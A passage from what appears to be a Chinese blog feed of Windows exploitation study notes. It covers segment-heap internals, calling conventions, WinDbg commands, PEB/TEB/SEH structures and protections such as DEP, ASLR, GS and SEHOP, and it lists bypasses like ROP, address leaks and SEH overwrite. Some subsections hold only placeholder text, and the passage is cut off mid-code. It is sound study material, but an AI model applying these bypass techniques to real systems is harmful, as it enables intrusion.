BlockCount       : Uint2B</span><br><span class="line">   +0x020 InterlockedShort : Int2B</span><br><span class="line">   +0x020 InterlockedLong  : Int4B</span><br><span class="line">   +0x024 FreeHint         : Uint2B</span><br><span class="line">   +0x026 Location         : UChar</span><br><span class="line">   +0x027 WitheldBlockCount : UChar</span><br><span class="line">   +0x028 BlockOffsets     : _HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS</span><br><span class="line">   +0x02c CommitUnitShift  : UChar</span><br><span class="line">   +0x02d CommitUnitCount  : UChar</span><br><span class="line">   +0x02e CommitStateOffset : Uint2B</span><br><span class="line">   +0x030 BlockBitmap      : [1] Uint8B</span><br></pre></td></tr></table></figure><p><code>ListEntry</code>：指向前（后）一个 LFH Subsegment</p><p><code>FreeCount</code>：LFH Subsegment 中空闲 <code>Block</code> 的数量。</p><p><code>BlockCount</code>：LFH Subsegment 中 <code>Block</code> 的数量。</p><p><code>FreeHint</code>：释放的 <code>Block</code> 中的最小下标。</p><p><code>Location</code>：标记该 LFH Subsegment 所在的位置。</p><ul><li>0：<code>AvailableSubsegmentList</code></li><li>1：<code>FullSubsegmentList</code></li><li>2：表示 FLH Subsegment 不在链表中</li></ul><p><code>BlockOffsets (_HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS)</code>：被加密为 <code>EncodedData = RtlpHpHeapGlobals.LfhKey ^ BlockOffsets ^ (Subsegment &gt;&gt; 12)</code> 。</p><p><code>BlockBitmap</code>：每个 LFH 块的状态由该块位图中的 2 个比特表示。</p><ul><li>bit 0：is busy bit</li><li>bit 1：unused bytes</li></ul><p><code>Block</code>：分配器返回给用户的内存。对于已分配的 <code>Block</code> 如果 <code>UnusedBytes</code> 不为 0 会把 <code>Block</code> 在最后 2 字节作为 <code>UnusedBytes</code> ，如果 <code>UnusedBytes</code> 为 1则将最后 2 字节置为 0x8000</p><h4 id="分配-1"><a href="#分配-1" class="headerlink" title="分配"></a>分配</h4><p>aaa</p><h4 id="释放-1"><a href="#释放-1" class="headerlink" title="释放"></a>释放</h4><p>aaa</p><h3 id="后端堆-1"><a href="#后端堆-1" class="headerlink" title="后端堆"></a>后端堆</h3><h4 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h4><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764636569750.png" alt="1764636569750"></p><h5 id="HEAP-SEG-CONTEXT"><a href="#HEAP-SEG-CONTEXT" class="headerlink" title="_HEAP_SEG_CONTEXT"></a>_HEAP_SEG_CONTEXT</h5><p><code>SegmentMask</code>：用于从 <code>BlockPtr</code> 找到 <code>PageSegment</code> ： <code>PageSegment = BlockPtr &amp; SegmentMask</code> 。</p><p><code>UnitShift</code>：一个 <code>PageDescriptor</code> 维护的内存的大小关于 2 取对数，用于计算 <code>BlockPtr</code> 所在 <code>Page</code> 对应的 <code>PageDescriptor</code> 的下标：<code>Index = BlockPtr &gt;&gt; UnitShift</code> 。</p><p><code>PagePerUnitShift</code>：一个 <code>PageDescriptor</code> 维护的内存的的内存页数（即大小除以 0x1000）关于 2 取对数。</p><p><code>FirstDescriptorIndex</code>：第一个 <code>PageDescriptor</code> 在 <code>SegContext</code> 中的下标。</p><p><code>LfhContext</code>：指向 Segment Heap 的 <code>LfhContext</code> 。</p><p><code>VsContext</code>：指向 Segment Heap 的 <code>VsContext</code> 。</p><p><code>Heap</code>：指向所属的 Segment Heap 。</p><p><code>SegmentListHead</code>：指向 <code>PageSegment</code> 的双向链表。</p><p><code>SegmentCount</code>：<code>PageSegment</code> 的数量。</p><p><code>FreePageRanges</code>：维护空闲的 Subsegment 的红黑树，树的节点为 <code>PageSegment.DescArray</code> 中的元素。与 VS 堆的 <code>FreeChunkTree</code> 相似。</p><p><code>FreeSegmentList</code>：存放空闲的 <code>PageSegment</code> 。</p><h5 id="HEAP-PAGE-SEGMENT"><a href="#HEAP-PAGE-SEGMENT" class="headerlink" title="_HEAP_PAGE_SEGMENT"></a>_HEAP_PAGE_SEGMENT</h5><p><code>ListEntry</code>：连接链表中的前后 <code>PageSegment</code> 。</p><p><code>Signature</code>：用来检验 <code>PageSegment</code> 是否有效，通过 <code>PageSegment ^ SegContext ^ RtlpHpHeapGlobals.HeapKey ^ 0xA2E64EADA2E64EAD</code> 计算。</p><p><code>DescArray (_HEAP_PAGE_RANGE_DESCRIPTOR)</code>：数组中的每个元素对应描述 <code>PageSegment</code> 中一个内存页的状态。</p><h5 id="HEAP-PAGE-RANGE-DESCRIPTOR"><a href="#HEAP-PAGE-RANGE-DESCRIPTOR" class="headerlink" title="_HEAP_PAGE_RANGE_DESCRIPTOR"></a>_HEAP_PAGE_RANGE_DESCRIPTOR</h5><p>页面描述符指示页面段中每个页面的状态（已分配或已释放）和信息（页面是否为块的开始、块的大小等）。它可以被划分为已分配和释放。</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764637028567.png" alt="1764637028567"></p><p><code>TreeSignature</code>：<code>PageRangeDescriptor</code> 的签名，值为恒为 0xCCDDCCDD 。只在 <code>Block</code> 的开头对应的 <code>PageRangeDescriptor</code> 才有。<code>UnusedBytes</code>：申请的块未使用的部分的大小。</p><p><code>RangeFlag</code>：表示页的状态。</p><ul><li>Bit 1：allocted bit</li><li>Bit 2：block header bit</li><li>Bit 3：Commited<ul><li>LFH：<code>RangeFlag &amp; 0xc = 8</code></li><li>VS：<code>RangeFlag &amp; 0xc = 0xc</code></li></ul></li><li><code>CommitedPageCount</code>：表示相应页面中提交的页数。</li><li><code>key (_HEAP_DESCRIPTOR_KEY)</code>：存储与 <code>PageRangeDescriptor</code> 对应的页面的一些相关信息。</li></ul><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764637185001.png" alt="1764637185001"></p><p><code>TreeNode (_RTL_BALANCED_NODE)</code>：</p><ul><li><code>Left</code>：指向大小小于当前 <code>PageRangeDescriptor</code> 对应 <code>Block</code> 的 <code>Block</code> 对应的 <code>PageRangeDescriptor</code> 。</li><li><code>Right</code>：指向大小大于当前 <code>PageRangeDescriptor</code> 对应 <code>Block</code> 的 <code>Block</code> 对应的 <code>PageRangeDescriptor</code> 。</li><li><code>ParentValue</code>：指向父节点，指针最低 1 比特表示是否加密。</li></ul><h4 id="分配-2"><a href="#分配-2" class="headerlink" title="分配"></a>分配</h4><h4 id="释放-2"><a href="#释放-2" class="headerlink" title="释放"></a>释放</h4>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 学习（一）</title>
      <link href="/2025/10/04/2025-10-4-learning_windows_pwn_1/"/>
      <url>/2025/10/04/2025-10-4-learning_windows_pwn_1/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><table><thead><tr><th>调用约定</th><th>定义</th><th>参数传递</th><th>栈平衡</th><th>特点</th><th>应用场景</th></tr></thead><tbody><tr><td><strong>__cdecl</strong></td><td>C语言默认调用约定</td><td>参数从右向左依次压入栈中</td><td>调用者(caller)负责清理栈空间</td><td>支持可变参数函数(VARARG)，因为调用者知道传递了多少参数</td><td>C&#x2F;C++程序中的普通函数默认使用此约定</td></tr><tr><td><strong>__stdcall</strong></td><td>标准调用约定</td><td>参数从右向左依次压入栈中</td><td>被调用函数(callee)负责清理栈空间</td><td>生成的代码比__cdecl小，因为不需要在每个调用点都包含栈清理代码</td><td>Windows API函数主要使用此约定</td></tr><tr><td><strong>__fastcall</strong></td><td>快速调用约定</td><td>前两个DWORD或更小的参数通过寄存器(ECX和EDX)传递，其余参数从右向左压栈</td><td>被调用函数(callee)负责清理栈空间</td><td>通过寄存器传递参数提高函数调用速度</td><td>需要高性能的函数调用场景</td></tr><tr><td><strong>__thiscall</strong></td><td>C++成员函数调用约定</td><td>this指针通过ECX寄存器传递，其余参数从右向左压栈</td><td>被调用函数(callee)负责清理栈空间</td><td>专为C++类成员函数设计</td><td>C++类的非静态成员函数调用</td></tr></tbody></table><ul><li>VARARG 表示参数的个数可以是不确定的，如果使用 VARARG 参数类型，就是调用程序平衡栈，否则按照默认方式平衡栈。</li><li><code>__fastcall</code> 传参规则为前两个参数通过 ecx 和 edx 传递，之后的参数通过栈传递。</li><li><code>__thiscall</code> 传参规则为 ecx 传递 this 指针，其余参数按照从右到左顺序入栈。</li></ul><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><ul><li><code>__thiscall</code> 传参规则为 rcx 传递 this 指针，前三个参数通过 rdx、r8、r9 传递，剩余参数布置在栈中。</li><li>其他类型的函数调用传参规则为前四个参数通过 rcx、rdx、r8、r9，剩余参数布置在栈中。</li><li>栈平衡由调用者完成。</li></ul><p>这里需要着重强调一下 windows 64 位函数调用的堆栈。</p><p>在函数调用前前 4 个参数放在寄存器中，第 5 个参数开始依次从 <code>[rsp + 0x20]</code> 位置处开始存放。进入调用的函数后会将寄存器中的参数存放到返回地址后空缺的位置上。</p><p><img src="/image/2025-10-4-learning_windows_pwn_1/1759563374342.png" alt="1759563374342"></p><h2 id="常见-dll"><a href="#常见-dll" class="headerlink" title="常见 dll"></a>常见 dll</h2><ul><li><p>ntdll.dll</p><ul><li><p><strong>核心作用</strong> ：Windows系统最底层的用户模式接口</p></li><li><p><strong>包含未公开API</strong> ：</p><ul><li>实现了Windows Native API（未完全公开的系统接口）</li><li>包含如 <code>NtCreateFile</code>、<code>NtReadFile</code>、<code>NtAllocateVirtualMemory</code>等核心函数</li><li>这些API通常以 <code>Nt</code>或 <code>Zw</code>前缀开头</li></ul></li><li><p><strong>系统调用入口</strong> ：</p><ul><li>是用户模式到内核模式转换的关键桥梁</li><li>通过 <code>syscall</code>&#x2F;<code>sysenter</code>指令触发实际的系统调用</li><li>例如：<code>NtCreateFile</code>最终会触发系统调用号，进入内核的 <code>ntoskrnl.exe</code></li></ul></li><li><p><strong>各版本间不同</strong></p></li></ul></li><li><p>kernel32.dll</p><ul><li><p><strong>核心作用</strong> ：Windows API的主要封装层</p></li><li><p><strong>基础功能API</strong> ：</p><ul><li>提供堆管理（<code>HeapAlloc</code>、<code>HeapFree</code>）</li><li>虚拟内存操作（<code>VirtualAlloc</code>、<code>VirtualFree</code>）</li><li>文件I&#x2F;O（<code>CreateFile</code>、<code>ReadFile</code>、<code>WriteFile</code>）</li><li>进程&#x2F;线程管理（<code>CreateProcess</code>、<code>CreateThread</code>）</li></ul></li><li><p><strong>ntdll函数的封装</strong> ：</p><ul><li>大多数kernel32函数只是简单包装了ntdll中的对应函数</li><li>例如：<code>CreateFileW</code> → <code>BasepCreateFile</code> → <code>NtCreateFile</code></li><li>API 几乎不会修改</li></ul></li></ul></li><li><p>mscrtxxx.dll &#x2F; ucrtbase.dll</p><ul><li><strong>核心作用</strong> ：C语言运行时库的Windows实现</li></ul></li><li><p><strong>mscrtxxx.dll</strong> ：</p><ul><li>旧版Microsoft C运行时库（如msvcr120.dll）</li><li>类似于Linux中的glibc（GNU C Library）</li></ul></li><li><p><strong>ucrtbase.dll</strong> ：</p><ul><li>Windows 10引入的统一C运行时库（Universal CRT）</li></ul></li></ul><p>dll 之间的函数调用关系如下图所示：</p><p><img src="/image/2025-10-4-learning_windows_pwn_1/1759569034306.png" alt="1759569034306"></p><h2 id="windbg调试命令"><a href="#windbg调试命令" class="headerlink" title="windbg调试命令"></a>windbg调试命令</h2><p><code>r</code> 查看寄存器状态和当前运行指令</p><p><code>lmi</code> 查看进程加载的各个模块。通过这个命令可以获得模块的加载基址。</p><p><code>!address</code> 查看更详细的段信息，类似 pwndbg 的 <code>vmmap</code> 功能。</p><p><code>!address 地址</code> 查看某个地址所在段信息。</p><p><code>dq</code> 八字节查看，<code>dd</code> 四字节查看，<code>dw</code> 两字节查看，<code>dc</code> 一字节查看</p><p><code>eq &lt;address&gt; &lt;value&gt;</code> 修改 8 字节长度的内存中的值。<code>ed</code>，<code>ew</code>，<code>eb</code> 同理，只是修改内存长度有区别。</p><p><code>bp &lt;address&gt; &quot;&lt;condition&gt;&quot;</code> 在某地址处下条件断点，例如 <code>bp 00401234 &quot;eax==0&quot;</code> 。</p><p><code>bl</code> 查看断点，直接点击 <code>Disable</code> 来暂时停用断点，点击 <code>Clear</code> 清除断点。</p><p><code>bu</code>：设置未解析断点，命令设置延迟或未解析的断点。<code>bu EzWinHeap+0x140001566</code></p><p><code>u 地址</code> 查看某地址处的汇编，<code>u</code> 查看程序运行位置的汇编，<code>uf</code> 会一直反汇编到 ret 指令。</p><p><code>dt structure [address]</code> 把 address 当成 structure 类型的结构体解析，如果不加 address 就会单纯打印出结构体。</p><p><code>s -a 7adf0000 L100000 &quot;cmd.exe&quot;</code> 搜索字符串</p><p><code>s -q 0x00000207fbee0000 L1000 0x207fbee07c0</code> 搜索地址</p><p>程序运行到断点停止：g</p><p><code>p</code> 步过 <code>t</code> 步入 <code>gu</code> 步出 <code>k</code> 查看 trace back</p><p><code>~*</code> 用来查看所有线程的信息，可以用来获取 TEB 基址。</p><p><code>~#</code> 显示最初导致异常的线程（或在调试器附加到进程时处于活动状态）。</p><p><code>~[线程编号]s</code>：调试的时候切换线程，例如 <code>~0s</code> 表示切换到 0 号线程，这里的编号即前面 <code>~*</code> 显示在前面的 0，1，2 。</p><p><code>? 0074fbf4 - 74fa68</code> 可以进行简单运算。</p><p><code>x ucrtbased!_read</code> 打印 <code>read</code> 函数的地址和其他信息。这个命令支持通配符，比如 <code>x ucrtbased!*read</code> 。</p><h2 id="常见结构体"><a href="#常见结构体" class="headerlink" title="常见结构体"></a>常见结构体</h2><h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><p>PEB（Process Environment Block）是 Windows 操作系统中的一个数据结构，它包含了进程的上下文信息。每个进程都有一个唯一的 PEB，它被存储在进程的用户模式地址空间中。在x86系统中位于 <code>fs:[30h]</code>，在x64系统中位于 <code>gs:[60h]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">    BYTE Reserved1[<span class="number">2</span>];</span><br><span class="line">    BYTE BeingDebugged;</span><br><span class="line">    BYTE Reserved2[<span class="number">1</span>];</span><br><span class="line">    PVOID Reserved3[<span class="number">2</span>];</span><br><span class="line">    PPEB_LDR_DATA Ldr;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    BYTE Reserved4[<span class="number">104</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">52</span>];</span><br><span class="line">    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">    BYTE Reserved6[<span class="number">128</span>];</span><br><span class="line">    PVOID Reserved7[<span class="number">1</span>];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">&#125; PEB,*PPEB;</span><br></pre></td></tr></table></figure><p>PEB 与 TEB 的相对偏移固定，使用 <code>.process</code> 或者 <code>r $peb</code> 查看进程的 PEB 地址，随后使用 <code>dt _PEB peb_addr</code> 查看进程的 PEB 信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; .process</span><br><span class="line">Implicit process is now 00c37000</span><br><span class="line">0:000&gt; r $peb</span><br><span class="line">$peb=00c37000</span><br><span class="line">0:000&gt; dt _PEB 00c37000</span><br><span class="line">ntdll!_PEB</span><br><span class="line">   +0x000 InheritedAddressSpace : 0 &#x27;&#x27;</span><br><span class="line">   +0x001 ReadImageFileExecOptions : 0 &#x27;&#x27;</span><br><span class="line">   +0x002 BeingDebugged    : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x003 BitField         : 0x4 &#x27;&#x27;</span><br><span class="line">   +0x003 ImageUsesLargePages : 0y0</span><br><span class="line">   +0x003 IsProtectedProcess : 0y0</span><br><span class="line">   +0x003 IsImageDynamicallyRelocated : 0y1</span><br><span class="line">   +0x003 SkipPatchingUser32Forwarders : 0y0</span><br><span class="line">   +0x003 IsPackagedProcess : 0y0</span><br><span class="line">   +0x003 IsAppContainer   : 0y0</span><br><span class="line">   +0x003 IsProtectedProcessLight : 0y0</span><br><span class="line">   +0x003 IsLongPathAwareProcess : 0y0</span><br><span class="line">   +0x004 Mutant           : 0xffffffff Void</span><br><span class="line">   +0x008 ImageBaseAddress : 0x00540000 Void</span><br><span class="line">   +0x00c Ldr              : 0x775deb20 _PEB_LDR_DATA</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><p><code>!peb</code> 查看 PEB 的具体内容，ImageBaseAddress为程序基地址，ProcessHeap为堆地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !peb</span><br><span class="line">PEB at 00c37000</span><br><span class="line">    InheritedAddressSpace:    No</span><br><span class="line">    ReadImageFileExecOptions: No</span><br><span class="line">    BeingDebugged:            Yes</span><br><span class="line">    ImageBaseAddress:         00540000</span><br><span class="line">    NtGlobalFlag:             70</span><br><span class="line">    NtGlobalFlag2:            0</span><br><span class="line">    Ldr                       775deb20</span><br><span class="line">    Ldr.Initialized:          Yes</span><br><span class="line">    Ldr.InInitializationOrderModuleList: 01075268 . 01075778</span><br><span class="line">    Ldr.InLoadOrderModuleList:           01075370 . 01077610</span><br><span class="line">    Ldr.InMemoryOrderModuleList:         01075378 . 01077618</span><br><span class="line">            Base TimeStamp                     Module</span><br><span class="line">          540000 5eff73f6 Jul 04 02:07:50 2020 C:\1\Download\easyWinHeap\EasyWinHeap.exe</span><br><span class="line">        774b0000 C:\Windows\SYSTEM32\ntdll.dll</span><br><span class="line">        76030000 25e3fa57 Feb 22 22:42:31 1990 C:\Windows\System32\KERNEL32.DLL</span><br><span class="line">        76580000 53a79838 Jun 23 11:00:08 2014 C:\Windows\System32\KERNELBASE.dll</span><br><span class="line">        76b90000 C:\Windows\System32\ucrtbase.dll</span><br><span class="line">        69a10000 5e74ae97 Mar 20 19:52:55 2020 C:\1\Download\easyWinHeap\VCRUNTIME140.dll</span><br><span class="line">    SubSystemData:     00000000</span><br><span class="line">    ProcessHeap:       01070000</span><br><span class="line">    ProcessParameters: 01072c70</span><br><span class="line">    CurrentDirectory:  &#x27;C:\Windows\system32\&#x27;</span><br><span class="line">    WindowTitle:  &#x27;C:\1\Download\easyWinHeap\EasyWinHeap.exe&#x27;</span><br><span class="line">    ImageFile:    &#x27;C:\1\Download\easyWinHeap\EasyWinHeap.exe&#x27;</span><br><span class="line">    CommandLine:  &#x27;C:\1\Download\easyWinHeap\EasyWinHeap.exe&#x27;</span><br><span class="line">    DllPath:      &#x27;&lt; Name not readable &gt;&#x27;</span><br><span class="line">    Environment:  01070cf8</span><br></pre></td></tr></table></figure><h3 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h3><p>TEB（Thread Environment Block）是 Windows 操作系统中的一个线程私有的数据结构，用于存储线程相关的信息。每个线程都有一个对应的 TEB 。32 位程序 FS 寄存器指向当前线程的 TEB ，64 位程序 GS 寄存器指向当前线程的 TEB 。</p><p>使用 <code>r $teb</code> 查看进程的 TEB 地址，<code>!teb</code> 可以查看 TEB 详细信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r $teb</span><br><span class="line">$teb=00c3a000</span><br><span class="line">0:000&gt; !teb</span><br><span class="line">TEB at 00c3a000</span><br><span class="line">    ExceptionList:        00bbf2a0</span><br><span class="line">    StackBase:            00bc0000</span><br><span class="line">    StackLimit:           00bbd000</span><br><span class="line">    SubSystemTib:         00000000</span><br><span class="line">    FiberData:            00001e00</span><br><span class="line">    ArbitraryUserPointer: 00000000</span><br><span class="line">    Self:                 00c3a000</span><br><span class="line">    EnvironmentPointer:   00000000</span><br><span class="line">    ClientId:             00002d78 . 00003c8c</span><br><span class="line">    RpcHandle:            00000000</span><br><span class="line">    Tls Storage:          01075d60</span><br><span class="line">    PEB Address:          00c37000</span><br><span class="line">    LastErrorValue:       0</span><br><span class="line">    LastStatusValue:      0</span><br><span class="line">    Count Owned Locks:    0</span><br><span class="line">    HardErrorMode:        0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TEB 的开头是一个 NT_TIB 结构，Thread Infomation Block，线程信息块，具体如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _nt_tib</span><br><span class="line">ntdll!_NT_TIB</span><br><span class="line">   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 StackBase        : Ptr32 Void  // 线程堆栈顶 </span><br><span class="line">   +0x008 StackLimit       : Ptr32 Void   // 线程堆栈底</span><br><span class="line">   +0x00c SubSystemTib     : Ptr32 Void</span><br><span class="line">   +0x010 FiberData        : Ptr32 Void</span><br><span class="line">   +0x010 Version          : Uint4B</span><br><span class="line">   +0x014 ArbitraryUserPointer : Ptr32 Void</span><br><span class="line">   +0x018 Self             : Ptr32 _NT_TIB   // _NT_TIB结构体的自引用指针</span><br></pre></td></tr></table></figure><p>可以用于泄露栈地址</p><h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><p>SEH（Structured Exception Handling，结构化异常处理）是 Windows 操作系统中的一种异常处理机制。</p><p>异常处理需要注册异常，即在异常处理链表中添加 <code>_EXCEPTION_REGISTRATION_RECORD</code> 节点</p><p><code>_EXCEPTION_REGISTRATION_RECORD</code> 中的 <code>Next</code> 指向上一个 <code>_EXCEPTION_REGISTRATION_RECORD</code> 结构，<code>Handler</code> 指向异常处理的代码。</p><p><img src="/image/2025-10-4-learning_windows_pwn_1/1759645034590.png" alt="1759645034590"></p><h2 id="常见保护"><a href="#常见保护" class="headerlink" title="常见保护"></a>常见保护</h2><h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><ul><li>类似 Linux 上的 NX 保护，可以理解为内存的可写和可执行不共存。</li><li>绕过方法<ul><li>ROP</li><li>调用 VirtualProtect （类似于 Linux 的 mprotect）</li></ul></li></ul><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><ul><li>TEB&#x2F;PEB&#x2F;heap&#x2F;stack 的基址每次运行程序都会改变</li><li>一些内核相关的 dll 例如 ntdll.dll 和 kernel32.dll 在所有进程中基址相同</li><li>绕过方法<ul><li><p>泄露地址</p><ul><li>一些 dll 的加载基址在所有进程都相同，因此可以在另一个进程中泄露基址。<ul><li>模块加载基址每次重启才会改变，因此只要靶机不重启不必每次运行程序时泄露基址。</li></ul></li></ul></li></ul></li></ul><h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><ul><li>windows 版的 canary</li><li>绕过方法<ul><li>泄露canary值（通过信息泄露漏洞）</li><li>覆盖SEH处理程序指针（利用未受GS保护的SEH）</li></ul></li></ul><h3 id="CheckStackVars"><a href="#CheckStackVars" class="headerlink" title="CheckStackVars"></a>CheckStackVars</h3><p>这个保护是在函数返回前调用 <code>_RTC_CheckStackVars</code> 函数检查栈中的局部变量的前后 4 字节是否被修改，通常在 Debug 版程序中会出现。</p><p>函数在结束时调用了 <code>CheckStackVars</code> ，函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">RTC_CheckStackVars</span><span class="params">(<span class="type">void</span> *Esp, _RTC_framedesc *Fd)</span></span><br></pre></td></tr></table></figure><p>这个函数遍历 _RTC_vardesc (保存在 <code>.rdata</code> 段)描述的所有局部变量，检查变量的前后 4 字节是否被修改（即是否不是 0xCCCCCCCC）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTC_vardesc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> addr;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span> *name;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTC_framedesc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> varCount;</span><br><span class="line">  _RTC_vardesc *variables;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/image/2025-10-4-learning_windows_pwn_1/1759651314902.png" alt="1759651314902"></p><h3 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h3><p>在 <code>ntdll!RtlDispatchException</code> 中有对 SEH 链表的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">      RtlpGetStackLimits(&amp;StackLimit, &amp;StackBase);</span><br><span class="line">      ExceptionList = NtCurrentTeb()-&gt;NtTib.ExceptionList;</span><br><span class="line">      ProcessInformation = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ZwQueryInformationProcess((HANDLE)<span class="number">0xFFFFFFFF</span>, ProcessExecuteFlags, &amp;ProcessInformation, <span class="number">4u</span>, <span class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        ProcessInformation = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (ProcessInformation &amp; <span class="number">0x40</span>) != <span class="number">0</span> || RtlpIsValidExceptionChain(ExceptionList, StackLimit, StackBase) )<span class="comment">// SEHOP</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_11:</span><br><span class="line">        RegistrationPointerForCheck = ExceptionList;</span><br><span class="line">        NestedRegistration = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( RegistrationPointerForCheck != (_EXCEPTION_REGISTRATION_RECORD *)<span class="number">-1</span> )<span class="comment">// -1 表示 SEH 链结束</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)RegistrationPointerForCheck &lt; StackLimit</span><br><span class="line">            || (<span class="type">unsigned</span> <span class="type">int</span>)&amp;RegistrationPointerForCheck[<span class="number">1</span>] &gt; StackBase<span class="comment">// SEH 节点不在栈中</span></span><br><span class="line">            || ((<span class="type">unsigned</span> __int8)RegistrationPointerForCheck &amp; <span class="number">3</span>) != <span class="number">0</span><span class="comment">// SEH 节点的位置没有 4 字节对齐</span></span><br><span class="line">            || (Handler = RegistrationPointerForCheck-&gt;Handler, (<span class="type">unsigned</span> <span class="type">int</span>)Handler &lt; StackBase)</span><br><span class="line">            &amp;&amp; StackLimit &lt;= (<span class="type">unsigned</span> <span 